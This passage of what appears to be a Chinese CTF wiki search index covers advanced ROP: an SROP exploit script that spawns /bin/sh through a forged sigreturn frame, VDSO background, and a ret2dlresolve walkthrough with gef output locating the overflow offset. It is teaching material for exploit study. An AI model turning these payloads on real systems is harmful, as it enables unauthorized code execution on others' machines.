\nSigreturnFrame\n()\n\n\nsigframe\n.\nrax\n \n=\n \nconstants\n.\nSYS_execve\n\n\nsigframe\n.\nrdi\n \n=\n \nstack_addr\n \n+\n \n0x120\n  \n# \n/bin/sh\n \ns addr\n\n\nsigframe\n.\nrsi\n \n=\n \n0x0\n\n\nsigframe\n.\nrdx\n \n=\n \n0x0\n\n\nsigframe\n.\nrsp\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrip\n \n=\n \nsyscall_ret\n\n\n\nframe_payload\n \n=\n \np64\n(\nstart_addr\n)\n \n+\n \nb\n \n*\n \n8\n \n+\n \nstr\n(\nsigframe\n)\n\n\nprint\n \nlen\n(\nframe_payload\n)\n\n\npayload\n \n=\n \nframe_payload\n \n+\n \n(\n0x120\n \n-\n \nlen\n(\nframe_payload\n))\n \n*\n \n\\x00\n \n+\n \n/bin/sh\n\\x00\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\nsh\n.\nsend\n(\nsigreturn\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5176\u57fa\u672c\u6d41\u7a0b\u4e3a\n\n\n\n\n\u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\n\n\n\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1\n\n\n\u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002\n\n\n\u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload\n\n\n\u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0)\n\n\n\u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\u9898\u76ee\n\n\n\n\nDefcon 2015 Qualifier: fuckup\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nSigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406\n\n\nSROP by Angle Baby\n\n\n\u7cfb\u7edf\u8c03\u7528\n\n\n\n\nret2VDSO\n\n\nVDSO\u4ecb\u7ecd\n\n\n\u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\n\n\n\n\nintel\u5b9e\u73b0\u4e86sysenter\uff0csysexit\n\n\namd\u5b9e\u73b0\u4e86syscall\uff0csysret\n\n\n\n\n\u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982:\n\n\n\u279c  ~ ldd /bin/sh           \n    linux-vdso.so.1 \n=\n  \n(\n0x00007ffd8ebf2000\n)\n\n    libc.so.6 \n=\n /lib/x86_64-linux-gnu/libc.so.6 \n(\n0x00007f84ff2f9000\n)\n\n    /lib64/ld-linux-x86-64.so.2 \n(\n0x0000560cae6eb000\n)\n\n\n\n\n\n\u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002\n\n\n\u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09\n\n\npush\n \nebp\n\n\nmov\n \nebp\n,\nesp\n\n\n\n\n\n\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002\n\n\n\u539f\u7406\n\n\n\u5f85\u8865\u5145\u3002    \n\n\n\u9898\u76ee\n\n\n\n\nDefcon 2015 Qualifier fuckup\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://man7.org/linux/man-pages/man7/vdso.7.html\n\n\nhttp://adam8157.info/blog/2011/10/linux-vdso/\n\n\n\n\nJOP\n\n\nJump-oriented programming\n\n\nCOP\n\n\nCall-oriented programming", 
            "title": "\u9ad8\u7ea7 ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#rop", 
            "text": "\u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002", 
            "title": "\u9ad8\u7ea7ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#ret2_dl_runtime_resolve", 
            "text": "", 
            "title": "ret2_dl_runtime_resolve"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_1", 
            "text": "\u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002  \u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u8fd8\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b   \u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570  \u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002  \u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002    \u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002  \u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002  \u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002   \u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6   dl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002  dl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002   \u6ce8\u610f\uff1a   \u7b26\u53f7\u7248\u672c\u4fe1\u606f  \u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc- r_info)   8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002    \u91cd\u5b9a\u4f4d\u8868\u9879  r_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_2", 
            "text": "\u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_3", 
            "text": "\u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003   http://pwn4.fun/2016/11/09/Return-to-dl-resolve/  \uff0c\u6df1\u5165\u6d45\u51fa\u3002  https://www.math1as.com/index.php/archives/341/   \u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 gcc main.c -m32 -fno-stack-protector -o main  \u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002   \u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002  stage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002  stage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002  stage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002    \u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_4", 
            "text": "\u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002  gef \u27a4    pattern   create   200  [+]   Generating   a   pattern   of   200   bytes  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  [+]   Saved   as   $_gef0  gef \u27a4    r  Starting   program :   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / ret2dlresolve / main   Welcome   to   XDCTF2015 ~ !  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  Program   received   signal   SIGSEGV ,   Segmentation   fault.  0 x62616164   in   ??   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x000000c9  $ebx     :   0x00000000  $ecx     :   0xffffcc6c    \u2192    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama [...]  $edx     :   0x00000100  $esp     :   0xffffcce0    \u2192    eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...]  $ebp     :   0x62616163   ( caab ? )  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xffffcd50    \u2192    0xffffcd70    \u2192    0x00000001  $eip     :   0x62616164   ( daab ? )  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   zero   SIGN   trap   INTERRUPT   direction   overflow   RESUME   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500  [!]   Cannot   disassemble   from   $PC  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcce0 ,   l8 ]  8  0 xffffcce0 \u2502+ 0x00 :   eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...]    \u2190   $esp  0 xffffcce4 \u2502+ 0x04 :   faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra [...]  0 xffffcce8 \u2502+ 0x08 :   gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa [...]  0 xffffccec \u2502+ 0x0c :   haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta [...]  0 xffffccf0 \u2502+ 0x10 :   iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua [...]  0 xffffccf4 \u2502+ 0x14 :   jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva [...]  0 xffffccf8 \u2502+ 0x18 :   kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa [...]  0 xffffccfc \u2502+ 0x1c :   laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa [...]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    pattern   search   [!]   Syntax  pattern   search   PATTERN   [ SIZE ]  gef \u27a4    pattern   search   0x62616164  [+]   Searching   0x62616164  [+]   Found   at   offset   112   ( little-endian   search )   likely", 
            "title": "\u6b63\u5e38\u653b\u51fb"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-1", 
